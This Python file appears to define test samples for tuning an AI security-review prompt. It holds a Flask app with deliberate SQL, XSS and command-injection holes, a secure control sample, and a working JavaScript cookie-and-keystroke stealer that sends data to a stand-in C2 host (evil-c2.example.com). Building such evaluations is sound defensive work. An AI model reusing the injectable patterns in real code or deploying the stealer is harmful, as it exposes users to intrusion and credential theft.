"""
3.2 Prompt 调优 — 标准样本定义 + 对比测试

3 个标准样本:
  1. 已知漏洞代码 (Python SQL注入)
  2. 正常代码 (安全编码实践)
  3. 恶意脚本 (JS 信息窃取)
"""

SAMPLES_3_2 = [
    {
        "id": 1,
        "name": "已知漏洞代码 - Python SQL注入 + XSS",
        "task_type": "vulnerability_detection",
        "code": '''\
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route("/search")
def search():
    keyword = request.args.get("q", "")
    conn = sqlite3.connect("app.db")
    # BUG: 字符串拼接构造 SQL 查询
    query = "SELECT * FROM products WHERE name LIKE '%" + keyword + "%'"
    results = conn.execute(query).fetchall()
    # BUG: 未转义的用户输入直接渲染 HTML
    return render_template_string("<h1>Results for: " + keyword + "</h1>")

@app.route("/admin/run")
def admin_run():
    cmd = request.args.get("cmd", "")
    # BUG: 用户输入直接拼接到系统命令
    import os
    os.system("echo " + cmd)
    return "OK"
''',
        "expected_issues": [
            "SQL 注入",
            "XSS",
            "命令注入",
            "CWE-89",
            "CWE-79",
            "CWE-78",
        ],
        "should_not_report": [],
    },
    {
        "id": 2,
        "name": "正常代码 - 安全编码实践",
        "task_type": "vulnerability_detection",
        "code": '''\
import sqlite3
import hashlib
import bcrypt
from flask import Flask, request, render_template, escape

app = Flask(__name__)
app.config["SECRET_KEY"] = __import__("os").environ.get("SECRET_KEY")

@app.route("/user/<int:user_id>")
def get_user(user_id):
    conn = sqlite3.connect("app.db")
    # OK: 参数化查询
    query = "SELECT id, name, email FROM users WHERE id = ?"
    result = conn.execute(query, (user_id,)).fetchone()
    if result:
        return {
            "id": result[0],
            "name": result[1],
            "email": result[2],
        }
    return {"error": "Not found"}, 404

@app.route("/login", methods=["POST"])
def login():
    data = request.get_json()
    username = data.get("username", "")
    password = data.get("password", "")
    # OK: bcrypt 验证密码
    stored_hash = get_stored_hash(username)
    if stored_hash and bcrypt.checkpw(password.encode(), stored_hash):
        return {"status": "ok"}
    return {"status": "denied"}, 401

@app.route("/profile/<name>")
def profile(name):
    # OK: 使用 escape() 转义用户输入
    safe_name = escape(name)
    return render_template("profile.html", name=safe_name)

def hash_password(password: str) -> bytes:
    # OK: 使用 bcrypt + salt
    return bcrypt.hashpw(password.encode(), bcrypt.gensalt())

def get_stored_hash(username: str):
    return b"$2b$12$stored_hash_placeholder"
''',
        "expected_issues": [],
        "should_not_report": [
            "SQL 注入",
            "XSS",
            "命令注入",
        ],
    },
    {
        "id": 3,
        "name": "恶意脚本 - JS 信息窃取 + C2 通信",
        "task_type": "malware_analysis",
        "code": '''\
(function() {
    var c2 = "https://evil-c2.example.com/api";

    function collect() {
        var data = {
            cookies: document.cookie,
            localStorage: JSON.stringify(localStorage),
            userAgent: navigator.userAgent,
            url: window.location.href,
            timestamp: Date.now()
        };

        var img = new Image();
        img.src = c2 + "/collect?d=" + btoa(JSON.stringify(data));
    }

    document.addEventListener("keydown", function(e) {
        var keys = JSON.parse(localStorage.getItem("_k") || "[]");
        keys.push({key: e.key, time: Date.now()});
        localStorage.setItem("_k", JSON.stringify(keys));
        if (keys.length >= 50) {
            var xhr = new XMLHttpRequest();
            xhr.open("POST", c2 + "/keys", true);
            xhr.send(JSON.stringify(keys));
            localStorage.removeItem("_k");
        }
    });

    setInterval(collect, 30000);
    collect();
})();
''',
        "expected_issues": [
            "C2",
            "窃取",
            "键盘记录",
            "keylogging",
            "cookie",
            "信息窃取",
            "数据外传",
        ],
        "should_not_report": [],
    },
]
